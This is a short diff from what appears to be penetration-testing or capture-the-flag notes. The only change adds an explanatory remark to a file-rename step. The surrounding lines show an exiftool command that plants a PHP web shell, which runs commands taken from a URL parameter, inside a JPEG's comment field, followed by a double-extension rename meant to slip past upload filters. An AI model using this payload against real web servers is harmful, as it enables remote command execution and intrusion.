@@ -94,7 +94,7 @@
             - You can do this with gimp or exiftools:
 			```php
 			└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
-			└─$ mv file.jpg file.php.jpg
+			└─$ mv file.jpg file.php.jpg (modify the extension because .jpg is not an executable format)
 			```
 
         - - - -
